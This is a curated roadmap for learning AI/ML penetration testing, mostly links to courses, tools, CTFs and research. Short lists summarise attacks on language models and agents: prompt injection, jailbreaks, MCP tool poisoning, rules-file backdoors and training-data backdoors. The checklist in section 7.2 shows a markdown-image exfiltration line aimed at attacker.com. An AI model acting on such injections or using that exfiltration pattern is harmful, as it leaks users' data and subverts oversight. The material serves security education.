# 🛡️ AI/ML Pentesting Roadmap (2026 Edition)

![output](https://github.com/user-attachments/assets/ca866203-8e57-4063-9d63-4ac919ed7b07)

> A comprehensive, structured guide to learning AI/ML security and penetration testing — from zero to practitioner. Updated with the latest tools, research, attack surfaces (including MCP/agentic AI), and community resources.

---

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Phase 1 — Foundations](#phase-1--foundations)
3. [Phase 2 — AI/ML Security Concepts](#phase-2--aiml-security-concepts)
4. [Phase 3 — Prompt Injection & LLM Attacks](#phase-3--prompt-injection--llm-attacks)
5. [Phase 4 — Agentic AI & MCP Security ⭐ NEW](#phase-4--agentic-ai--mcp-security)
6. [Phase 5 — Hands-On Practice](#phase-5--hands-on-practice)
7. [Phase 6 — Advanced Exploitation Techniques](#phase-6--advanced-exploitation-techniques)
8. [Phase 7 — Real-World Research & Bug Bounty](#phase-7--real-world-research--bug-bounty)
9. [Standards, Frameworks & References](#standards-frameworks--references)
10. [Tools & Repositories](#tools--repositories)
11. [Books, PDFs & E-Books](#books-pdfs--e-books)
12. [Video Resources](#video-resources)
13. [CTF & Competitions](#ctf--competitions)
14. [Bug Bounty Programs](#bug-bounty-programs)
15. [Community & News](#community--news)
16. [Key Academic Papers](#key-academic-papers)
17. [Suggested Learning Path by Experience Level](#suggested-learning-path-by-experience-level)

---

## Prerequisites

Before diving into AI/ML pentesting, ensure you have the following foundation:

### General Security Basics
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free, hands-on web security training (XSS, SQLi, SSRF, etc.)
- [TryHackMe — Pre-Security Path](https://tryhackme.com/path/outline/presecurity)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Programming (Python is essential)
- [Python for Everybody — Coursera](https://www.coursera.org/specializations/python)
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) — Free online book
- [CS50P — Python](https://cs50.harvard.edu/python/) — Free Harvard course

### APIs & HTTP
- Understand REST APIs, HTTP methods, headers, and authentication flows
- [Postman Learning Center](https://learning.postman.com/)
- Practice with tools: `curl`, `Burp Suite`, `Postman`

---

## Phase 1 — Foundations

### 1.1 Machine Learning Fundamentals

| Resource | Type | Cost |
|---|---|---|
| [Machine Learning — Andrew Ng (Coursera)](https://www.coursera.org/learn/machine-learning) | Course | Audit Free |
| [Introduction to ML — edX](https://www.edx.org/course/introduction-to-machine-learning) | Course | Audit Free |
| [fast.ai Practical Deep Learning](https://course.fast.ai/) | Course | Free |
| [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) | Course | Free |
| [Kaggle ML Courses](https://www.kaggle.com/learn) | Course | Free |
| [3Blue1Brown — Neural Networks](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) | Video | Free |

### 1.2 Large Language Models (LLMs)

Understanding how LLMs work is critical before attacking them.

| Resource | Type | Cost |
|---|---|---|
| [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g) | Video | Free |
| [Andrej Karpathy — Let's build GPT](https://www.youtube.com/watch?v=kCc8FmEb1nY) | Video | Free |
| [Hugging Face NLP Course](https://huggingface.co/learn/nlp-course) | Course | Free |
| [LLM University by Cohere](https://llmu.cohere.com/) | Course | Free |
| [Prompt Engineering Guide](https://www.promptingguide.ai/) | Guide | Free |

---

## Phase 2 — AI/ML Security Concepts

### 2.1 Core Security Concepts

- [OWASP LLM Top 10 (2025)](https://genai.owasp.org/) — The definitive OWASP list for LLM vulnerabilities, updated for agentic systems
- [OWASP GenAI Red Teaming Guide](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — Practical red teaming methodology
- [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/) — Updated Oct 2025 with agentic AI techniques
- [NIST AI Risk Management Framework](https://airc.nist.gov/Home) — Federal AI risk guidance
- [IBM — AI Security Overview](https://www.ibm.com/topics/ai-security)
- [AI Village — LLM Threat Modeling](https://aivillage.org/large%20language%20models/threat-modeling-llm/)
- [HackerOne — Ultimate Guide to Managing Ethical and Security Risks in AI](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai)
- [Adversa AI 2025 Security Report](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/) — 35% of real-world AI incidents caused by simple prompts

### 2.2 Attack Surface Overview

Key attack vectors in AI/ML systems:

- **Prompt Injection** — Manipulating LLM behavior through crafted inputs
- **Indirect Prompt Injection (IPI)** — Attacks via documents, web content, emails, RAG pipelines
- **Jailbreaking** — Bypassing safety filters and guardrails
- **Multi-Turn Attacks** — Attacks unfolding across extended conversations (92% success rate reported in 2025 research)
- **Tool Poisoning** — Injecting malicious instructions into MCP tool metadata/descriptions
- **Model Inversion** — Extracting training data from a model
- **Membership Inference** — Determining if data was in training set
- **Data Poisoning** — Corrupting training data to influence behavior
- **Adversarial Examples** — Perturbed inputs that fool classifiers
- **Model Extraction/Stealing** — Cloning a model via API queries
- **Supply Chain Attacks** — Malicious models/weights on platforms like Hugging Face
- **MCP Server Exploitation** — Tool poisoning, resource theft, conversation hijacking via MCP
- **AI IDE Attacks** — Exploiting Cursor, GitHub Copilot, Claude Code via rules files and MCP config
- **RAG Poisoning** — Injecting malicious content into retrieval-augmented generation pipelines
- **Training Data Exfiltration** — Extracting memorized private data
- **Denial of Service** — Overloading models via crafted prompts
- **Agent-to-Agent Attacks** — Compromising multi-agent pipelines (A2A protocol abuse)

### 2.3 MLOps & Infrastructure Security

- [From MLOps to MLOops — JFrog](https://jfrog.com/blog/from-mlops-to-mloops-exposing-the-attack-surface-of-machine-learning-platforms/)
- [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
- [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits)
- [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security)

---

## Phase 3 — Prompt Injection & LLM Attacks

### 3.1 Understanding Prompt Injection

- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — Canonical definition updated for agentic systems; the baseline every 2025–26 tool cites
- [IBM Guide on Prompt Injection](https://www.ibm.com/topics/prompt-injection)
- [Simon Willison's Explanation of Prompt Injection](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
- [Prompt Injection in 2026: Why the Attack Surface Keeps Growing](https://notchrisgroves.com/prompt-injection-2026-attack-surface/) — Explains why the problem is structural, not fixable by filters, and covers the Morris II AI worm
- [Learn Prompting — Prompt Hacking and Injection](https://learnprompting.org/docs/prompt_hacking/injection)
- [PortSwigger LLM Attacks](https://portswigger.net/web-security/llm-attacks)
- [NCC Group — Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
- [Bugcrowd — AI Vulnerability Deep Dive: Prompt Injection](https://www.bugcrowd.com/blog/ai-vulnerability-deep-dive-prompt-injection/)
- [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/) — Practical cheat sheet for AI bot integrations
- [Don't You (Forget NLP) — Dropbox Tech](https://dropbox.tech/machine-learning/prompt-injection-with-control-characters-openai-chatgpt-llm) — Injection via control characters

### 3.2 Jailbreaking Techniques

- **DAN (Do Anything Now)** — Classic jailbreak technique: [Chatgpt-DAN Repo](https://github.com/alexisvalentino/Chatgpt-DAN)
- **Role-playing / Persona manipulation**
- **Token smuggling** — Encoding instructions to bypass filters
- **Prompt leaking** — Extracting system prompts
- **Indirect prompt injection** — Attacks via documents, web content, memory
- **Multi-turn jailbreaks** — Steering models over successive conversation turns (>90% bypass rate against most published defenses)
- [WideOpenAI — Jailbreak Collection](https://github.com/WibblyOWobbly/WideOpenAI)
- [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/)
- [PALLMs — Payloads for Attacking LLMs](https://github.com/mik0w/pallms/)

### 3.3 Indirect Prompt Injection

A sophisticated attack where malicious instructions are injected via external data sources (emails, documents, websites, RAG chunks) that an LLM agent processes.

- [Greshake — LLM Security / Not What You've Signed Up For](https://github.com/greshake/llm-security)
- [Embrace The Red — Blog](https://embracethered.com/blog/) — Leading blog covering real-world indirect injection
- [GitHub Copilot Chat: Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [Google AI Studio Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Indirect Prompt Injection Through MCP Tools: A Defense Guide](https://www.stackone.com/blog/indirect-prompt-injection-mcp-tools-defense) — Feb 2026, covers every MCP tool category
- [CrowdStrike — Indirect Prompt Injection Attacks: Hidden AI Risks](https://www.crowdstrike.com/en-us/blog/indirect-prompt-injection-attacks-hidden-ai-risks/) — Dec 2025, enterprise IPI TTPs and SOC detection signals
- [Lakera — Indirect Prompt Injection: The Hidden Threat](https://www.lakera.ai/blog/indirect-prompt-injection) — Zero-click RCE in MCP-based AI IDEs case study

### 3.4 Advanced Prompt Attack Techniques

- [How to Persuade an LLM to Change Its System Prompt](https://medium.com/@KonradDaWo/how-to-persuade-a-llm-to-change-its-system-prompt-to-aid-in-ctf-challenges-e74c1d570ed3)
- [Design Patterns for Securing LLM Agents Against Prompt Injection](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/) — Jun 2025
- [OpenAI — Hardening Atlas Against Prompt Injection Attacks](https://openai.com/index/hardening-atlas-against-prompt-injection/) — Dec 2025 real attack chain disclosure + RL-trained automated attacker
- [Improving LLM Security Against Prompt Injection: AppSec Guidance](https://blog.includesecurity.com/2024/01/improving-llm-security-against-prompt-injection-appsec-guidance-for-pentesters-and-developers/) — Role-based APIs and 13 system prompt guidelines
- [Bugcrowd Ultimate Guide to AI Security (PDF)](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf)
- [Snyk OWASP Top 10 LLM (PDF)](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf)
- [Vanna.AI Prompt Injection RCE — JFrog](https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/)

---

## Phase 4 — Agentic AI & MCP Security ⭐ NEW

This is the **fastest-growing and most dangerous attack surface** as of 2025–2026. When LLMs are given tools, memory, and autonomous action capabilities, the blast radius of any injection expands dramatically.

### 4.1 Why Agentic AI Changes Everything

Agentic AI systems operate in observe-orient-decide-act loops. They can browse the web, read/write files, execute code, call APIs, and communicate with other agents. A single successful injection can lead to:
- Remote Code Execution (RCE)
- Data exfiltration from private repositories
- Unauthorized financial transactions
- Lateral movement across multi-agent pipelines

Key reading:
- [AI Agent Attacks in Q4 2025 Signal New Risks for 2026 — eSecurity Planet](https://www.esecurityplanet.com/artificial-intelligence/ai-agent-attacks-in-q4-2025-signal-new-risks-for-2026/)
- [Enterprises Are Racing to Secure Agentic AI Deployments — Help Net Security](https://www.helpnetsecurity.com/2026/02/23/ai-agent-security-risks-enterprise/) — Multi-turn attacks achieved 92% success against 8 open-weight models
- [Adversa AI 2025 AI Security Incidents Report](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/)

### 4.2 Model Context Protocol (MCP) Security

MCP (introduced by Anthropic in late 2024) is rapidly becoming the standard for connecting LLMs to external tools — and is the dominant new attack surface.

**MCP-specific attack classes:**
- **Tool Poisoning** — Embedding malicious instructions in tool `description` fields that agents trust implicitly
- **Tool Shadowing** — Registering a malicious tool with a name/description that intercepts calls meant for a legitimate tool
- **Resource Theft** — Abusing MCP sampling to drain compute quotas
- **Conversation Hijacking** — Compromised MCP servers inject persistent instructions
- **Covert Tool Invocation** — Hidden file system operations without user awareness
- **Cross-MCP Contamination** — One MCP server overrides another's behavior

Key resources:
- [Palo Alto Unit 42 — New Prompt Injection Attack Vectors Through MCP Sampling](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) — Dec 2025, three critical attack vectors
- [Checkmarx — 11 Emerging AI Security Risks with MCP](https://checkmarx.com/zero-post/11-emerging-ai-security-risks-with-mcp-model-context-protocol/) — Nov 2025
- [OWASP CheatSheet — Securely Using Third-Party MCP Servers](https://owasp.org/) — Practical guide
- [MCP Prompt Injection: How AI Gets Hacked (YouTube)](https://www.youtube.com/watch?v=bO-7DB-3dL8) — Nov 2025 hands-on walkthrough
- [ToxicSkills: Snyk Finds Malware in 36% of AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — Feb 2026, 1,467 malicious payloads in ClawHub registry

### 4.3 AI IDE & Coding Assistant Security

AI coding assistants (Claude Code, GitHub Copilot, Cursor) have system-level access and are a high-value target.

- **Rules File Backdoor** — `.cursor/rules` and similar config files can be poisoned with malicious instructions
- **CVE-2025-53773** — GitHub Copilot RCE (CVSS 9.6) via prompt injection
- **CVE-2025-54135** — Cursor indirect prompt injection via MCP config → RCE
- **IDEsaster** — 30+ CVEs in AI IDEs: [The Hacker News coverage](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html)

Resources:
- [Rules File Backdoor — Cursor/Copilot](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor)
- [GitGuardian — Can GitHub Copilot Leak Secrets?](https://blog.gitguardian.com/yes-github-copilot-can-leak-secrets/)
- [Your AI, My Shell — arXiv 2025](https://arxiv.org/html/2509.22040v1) — Systematic analysis of prompt injection in agentic coding editors

### 4.4 Multi-Agent & RAG Pipeline Attacks

- **PoisonedRAG** (USENIX Security 2025) — Knowledge corruption attack injecting poisoned texts into RAG databases
- **A2A Protocol Abuse** — Google's Agent2Agent protocol creates new inter-agent attack surfaces
- **Log-To-Leak** — Covert privacy attacks via side channels in agent logs
- [ScienceDirect — From Prompt Injections to Protocol Exploits](https://www.sciencedirect.com/science/article/pii/S2405959525001997) — 30+ attack techniques catalogued across agent ecosystems

### 4.5 Meta's "Agents Rule of Two" Framework

Meta's Oct 2025 architectural approach: agents must satisfy **no more than two** of:
- (A) Processing untrustworthy inputs
- (B) Access to sensitive data
- (C) Ability to change state externally

This provides a deterministic way to bound blast radius. Read: [Meta — Practical AI Agent Security](https://ai.meta.com/blog/practical-ai-agent-security/)

---

## Phase 5 — Hands-On Practice

### 5.1 Interactive Platforms & Games

| Platform | Description | Link |
|---|---|---|
| Gandalf | LLM prompt testing game — extract the password (8 levels) | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamified prompt injection learning | [promptairlines.com](https://promptairlines.com/) |
| Crucible | Interactive AI security challenges by Dreadnode | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| Immersive Labs AI | Structured AI security exercises | [prompting.ai.immersivelabs.com](https://prompting.ai.immersivelabs.com/) |
| Secdim AI Games | Prompt injection games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| HackAPrompt | Community prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| PortSwigger LLM Labs | Hands-on web LLM attack labs | [Web Security Academy](https://portswigger.net/web-security/llm-attacks) |
| PromptTrace | 7 labs + 15-level CTF with real-time context trace; uses GPT-4, Claude, Gemini | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) |
| CrowdStrike AI Unlocked | Agent-focused prompt injection challenges by CrowdStrike (Feb 2026) | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
| AI/LLM Exploitation Challenges | AI, ML, LLM CTF challenges | [8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |

### 5.2 Vulnerable-by-Design Projects

| Repository | Description |
|---|---|
| [Damn Vulnerable LLM Agent — WithSecureLabs](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent) | Intentionally vulnerable ReAct LLM agent |
| [ScottLogic Prompt Injection Playground](https://github.com/ScottLogic/prompt-injection) | Local prompt injection lab |
| [Greshake LLM Security Tools](https://github.com/greshake/llm-security) | Proof-of-concept attacks |
| [ctf-prompt-injection by CharlesTheGreat77](https://github.com/CharlesTheGreat77/ctf-prompt-injection) | Dockerized CTF with Ollama + local LLM, progressively harder levels |
| [ai-prompt-ctf by c-goosen](https://github.com/c-goosen/ai-prompt-ctf) | Indirect injection against tool-calling agents: RAG, function calling, ReAct |

### 5.3 Tutorials

- [Google AI Red Teaming Walkthrough (PDF)](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf)
- [Spikee: Testing LLM Apps for Prompt Injection — WithSecure Labs](https://labs.withsecure.com/tools/spikee) — Step-by-step with Burp Suite integration
- [How AI Prompt Injection Works | Hands-on with LLMs (YouTube)](https://www.youtube.com/watch?v=fCpAr2OylDw) — Jan 2026 code-level demo with LLM Guard detection
- [Prompt Injection in LLM Agents: ReAct, Langchain (YouTube)](https://www.youtube.com/watch?v=43qfHaKh0Xk) — Theory and hands-on lab
- [Synthetic Recollections — WithSecure Labs](https://labs.withsecure.com/publications/llm-agent-prompt-injection) — ReAct loop hijacking via forged thoughts

### 5.4 CTF Writeups to Study

- [CTF Writeup — HackPack CTF 2024 LLM Edition](https://medium.com/@embossdotar/ctf-writeup-hackpack-ctf-2024-llm-edition-yellowdog-1-db02a36e1051)
- [LLM Pentest Writeups — System Weakness](https://systemweakness.com/large-language-model-llm-pen-testing-part-i-2ef96acb6763)

---

## Phase 6 — Advanced Exploitation Techniques

### 6.1 Agent & Tool Integration Attacks

- [LLM Pentest: Leveraging Agent Integration for RCE — BlazeInfoSec](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [Dumping a Database with an AI Chatbot — Synack](https://www.synack.com/blog/dumping-a-database-with-an-ai-chatbot/)
- [CSWSH Meets LLM Chatbots](https://medium.com/@r3vsh/cswsh-meets-llm-chatbots-3ab09af5ab6f)
- [Prompt Injection Attacks on Agentic Coding Assistants (SoK, arXiv 2026)](https://arxiv.org/html/2601.17548v1) — Meta-analysis of 78 studies; >85% attack success against state-of-the-art defenses

### 6.2 Data Exfiltration via LLMs

- [Google AI Studio: LLM-Powered Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Google AI Studio Mass Data Exfil (Regression)](https://embracethered.com/blog/posts/2024/google-aistudio-mass-data-exfil/)
- [Hacking Google Bard — From Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)
- [AWS Amazon Q Markdown Rendering Vulnerability](https://embracethered.com/blog/posts/2024/aws-amazon-q-fixes-markdown-rendering-vulnerability/)
- [GitHub Copilot Chat Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery](https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/)

### 6.3 Account Takeover & Authentication Attacks

- [ChatGPT Account Takeover — Wildcard Web Cache Deception](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [Shockwave — Critical ChatGPT Vulnerability (Web Cache Deception)](https://www.shockwave.cloud/blog/shockwave-works-with-openai-to-fix-critical-chatgpt-vulnerability)
- [Security Flaws in ChatGPT Ecosystem — Salt Security](https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data)
- [OpenAI Allowed Unlimited Credit on New Accounts — Checkmarx](https://checkmarx.com/blog/openai-allowed-unlimited-credit-on-new-accounts/)

### 6.4 XSS & Web Vulnerabilities in AI Products

- [XSS Marks the Spot: Digging Up Vulnerabilities in ChatGPT — Imperva](https://www.imperva.com/blog/xss-marks-the-spot-digging-up-vulnerabilities-in-chatgpt/)
- [Zeroday on GitHub Copilot](https://gccybermonks.com/posts/github/)
- [Prompt Injection 2.0: Hybrid AI Threats (arXiv 2025)](https://arxiv.org/abs/2507.13169) — Prompt injections combined with XSS, CSRF, AI worm propagation to evade WAFs

### 6.5 Model & Infrastructure Attacks

- [Shelltorch Explained — Multiple Vulnerabilities in TorchServe (CVSS 9.9)](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server)
- [From ChatBot to SpyBot: ChatGPT Post-Exploitation — Imperva](https://www.imperva.com/blog/from-chatbot-to-spybot-chatgpt-post-exploitation/)
- [Microsoft FIDES — Information-Flow Control Against IPI in Copilot](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks) — Jul 2025 privilege separation system

### 6.6 Persistent Attacks & Memory Exploitation

- [ChatGPT Persistent Denial of Service via Memory Attacks — Embrace the Red](https://embracethered.com/blog/posts/2024/chatgpt-persistent-denial-of-service/)

### 6.7 Adversarial Machine Learning

- [CleverHans Library](https://github.com/cleverhans-lab/cleverhans) — Adversarial example library
- [ART (Adversarial Robustness Toolbox) — IBM](https://github.com/Trusted-AI/adversarial-robustness-toolbox)
- [Foolbox](https://github.com/bethgelab/foolbox) — Python toolbox for adversarial attacks

### 6.8 Supply Chain & Model File Attacks

- Malicious code embedded in model files (pickle, safetensors) can execute on load
- 250 poisoned documents in training data can implant backdoors that activate on trigger phrases
- [ModelScan — ProtectAI](https://github.com/protectai/modelscan) — Scan ML model files for malicious payloads
- Fake npm/pip packages mimicking AI integrations (e.g., fake email MCP that silently copies outbound messages)

---

## Phase 7 — Real-World Research & Bug Bounty

### 7.1 Notable Research & Disclosures

- [We Hacked Google AI for $50,000 — LandH](https://www.landh.tech/blog/20240304-google-hack-50000/)
- [New Google Gemini Content Manipulation Vulnerabilities — HiddenLayer](https://hiddenlayer.com/research/new-google-gemini-content-manipulation-vulns-found/#Overview)
- [Jailbreak of Meta AI (Llama 3.1) Revealing Config Details](https://medium.com/@kiranmaraju/jailbreak-of-meta-ai-llama-3-1-revealing-configuration-details-9f0759f5006a)
- [My LLM Bug Bounty Journey on Hugging Face Hub](https://medium.com/@zpbrent/my-llm-bug-bounty-journey-on-hugging-face-hub-via-protect-ai-9f3a1bc72c2e)
- [Anonymised Penetration Test Report — Volkis](https://handbook.volkis.com.au/assets/doc/Volkis%20-%20Anonymous%20Client%20-%20Penetration%20Test%20May%202023.pdf)
- [Lakera Real World LLM Exploits (PDF)](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf)
- [AI Penetration Testing: A Complete Guide — HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html) — Mar 2026 comprehensive playbook

### 7.2 How to Find LLM Vulnerabilities

Key areas to test when assessing an LLM-powered application:

1. **System prompt extraction** — Can you leak the hidden system prompt?
2. **Instruction override** — Can you ignore system-level instructions?
3. **Plugin/tool abuse** — Can agent tools be misused (SSRF, RCE, SQLi)?
4. **MCP tool poisoning** — Can you inject instructions into tool metadata?
5. **Data exfiltration via markdown** — Does the UI render `![](https://attacker.com?q=...)` ?
6. **Persistent injection via memory/RAG** — Can you inject instructions that persist?
7. **PII leakage** — Does the model reveal training data or other users' data?
8. **Cross-user data leakage** — In multi-tenant apps, can you access other users' contexts?
9. **Authentication bypass** — Can you trick the LLM into performing privileged actions?
10. **Multi-turn escalation** — Can you steer the model across conversation turns?
11. **AI IDE rules file backdoor** — Can `.cursor/rules` or similar files be poisoned?
12. **Supply chain** — Are third-party models/datasets scanned for malicious payloads?

---

## Standards, Frameworks & References

| Resource | Description |
|---|---|
| [OWASP LLM Top 10 (2025)](https://genai.owasp.org/) | Top 10 LLM vulnerability classes, updated for agentic systems |
| [MITRE ATLAS](https://atlas.mitre.org/matrices/ATLAS/) | AI adversarial threat matrix (updated Oct 2025 with agentic techniques) |
| [NIST AI RMF](https://airc.nist.gov/Home) | US Federal AI risk management framework |
| [OWASP AI Exchange](https://owaspai.org/) | Cross-industry AI security guidance |
| [OWASP GenAI Red Teaming Guide](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | Practical red teaming methodology |
| [ISO/IEC 42001](https://www.iso.org/standard/81230.html) | International AI management standard |
| [ENISA AI Threat Landscape](https://www.enisa.europa.eu/publications/enisa-threat-landscape-for-artificial-intelligence) | EU AI threat landscape report |
| [Google Secure AI Framework (SAIF)](https://safety.google/cybersecurity-advancements/saif/) | Google's AI security framework |

---

## Tools & Repositories

### Offensive Tools

| Tool | Purpose |
|---|---|
| [Garak](https://github.com/leondz/garak) | LLM vulnerability scanner — automated red teaming and jailbreak testing |
| [PyRIT](https://github.com/Azure/PyRIT) | Microsoft's Python Risk Identification Toolkit for LLMs |
| [LLM Fuzzer](https://github.com/mnns/LLMFuzzer) | Fuzzing framework for LLMs |
| [PALLMs](https://github.com/mik0w/pallms/) | Payloads for attacking LLMs |
| [PromptInject](https://github.com/agencyenterprise/PromptInject) | Prompt injection attack framework |
| [PurpleLlama / CyberSecEval](https://github.com/facebookresearch/PurpleLlama) | Meta's LLM security evaluation |
| [LLM Injector](https://github.com/anmolksachan/LLMInjector) | LLM Injector Burp Suite Extension |
| [Prompt Map](https://github.com/utkusen/promptmap) | Security scanner for custom LLM applications |
| [Augustus — Praetorian](https://www.praetorian.com/blog/introducing-augustus-open-source-llm-prompt-injection/) | Feb 2026: 210+ probes, 47 attack categories, 28 LLM providers, Go binary |
| [Spikee — WithSecure](https://labs.withsecure.com/tools/spikee) | Custom injection datasets + automated tests, Burp Suite integration |
| [AgentSeal](https://github.com/agentseal/agentseal) | 150 attack probes against AI agents; supports OpenAI, Anthropic, Ollama |
| [Token Turbulenz](https://github.com/wunderwuzzi23/token-turbulenz) | Fuzzer to automate looking for prompt injections |
| [InjectLab](https://github.com/ahow2004/injectlab) | MITRE-style matrix of adversarial prompt injection techniques |

### Defensive / Scanning Tools

| Tool | Purpose |
|---|---|
| [Rebuff](https://github.com/protectai/rebuff) | Prompt injection detection |
| [NeMo Guardrails](https://github.com/NVIDIA/NeMo-Guardrails) | NVIDIA guardrail framework |
| [Lakera Guard](https://www.lakera.ai/) | Commercial prompt injection protection |
| [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits) | Real-world ML exploit collection |
| [ModelScan](https://github.com/protectai/modelscan) | Scan ML model files for malicious code |
| [Vigil LLM](https://github.com/deadbits/vigil-llm) | Stacked scanners: vector similarity, YARA, transformer classifier, canary tokens |
| [InjecGuard](https://github.com/safolab-wisc/injecguard) | +30.8% over prior SOTA on NotInject benchmark, addresses false positives |
| [Sentinel AI](https://github.com/MaxwellCalkin/sentinel-ai) | Real-time detection across 12 languages, Claude Code attack vectors, MCP proxy |
| [openclaw-bastion](https://github.com/AtlasPA/openclaw-bastion) | Detects Unicode homoglyphs, hidden HTML injection, zero-width character smuggling |
| [BodAIGuard](https://github.com/AxonLabsDev/BodAIGuard) | 3-tier detection (regex, heuristics, structural), 42 block rules |
| [tldrsec/prompt-injection-defenses](https://github.com/tldrsec/prompt-injection-defenses) | Actively maintained catalog of every practical defense in production |

### Reference Lists

| Resource | Description |
|---|---|
| [Awesome LLM Security — corca-ai](https://github.com/corca-ai/awesome-llm-security) | Curated LLM security list |
| [Awesome LLM — Hannibal046](https://github.com/Hannibal046/Awesome-LLM) | Everything LLM including security |
| [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security) | General AI security resources |
| [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook) | Comprehensive hacking handbook |
| [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/) | Payload collection |
| [WideOpenAI](https://github.com/WibblyOWobbly/WideOpenAI) | Jailbreak and bypass collection |
| [Chatgpt-DAN](https://github.com/alexisvalentino/Chatgpt-DAN) | DAN jailbreak collection |
| [Awesome Prompt Injection — FonduAI](https://github.com/FonduAI/awesome-prompt-injection) | Curated prompt injection resources (articles, papers, tools, CTFs) |
| [PIC Standard](https://github.com/madeinplutofabio/pic-standard) | Protocol to block unauthorized agent actions via intent + provenance checks |

---

## Books, PDFs & E-Books

| Resource | Link |
|---|---|
| LLM Hacker's Handbook | [GitHub](https://github.com/forcesunseen/llm-hackers-handbook) |
| OWASP Top 10 for LLM (Snyk) | [PDF](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf) |
| Bugcrowd Ultimate Guide to AI Security | [PDF](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf) |
| Lakera Real World LLM Exploits | [PDF](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf) |
| HackerOne Ultimate Guide to Managing AI Risks | [E-Book](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai) |
| Adversarial Machine Learning — Goodfellow et al. | [arXiv](https://arxiv.org/abs/1412.6572) |
| Google AI Red Team Walkthrough | [PDF](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf) |
| AI Penetration Testing 2026 Guide | [HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html) |

---

## Video Resources

| Resource | Link |
|---|---|
| Penetration Testing Against and With AI/LLM/ML (Playlist) | [YouTube](https://www.youtube.com/playlist?list=PL1Aj7oPl6slsd3Er7PfeOIEFYPDQvMRUf) |
| Andrej Karpathy — Intro to Large Language Models | [YouTube](https://www.youtube.com/watch?v=zjkBMFhNj_g) |
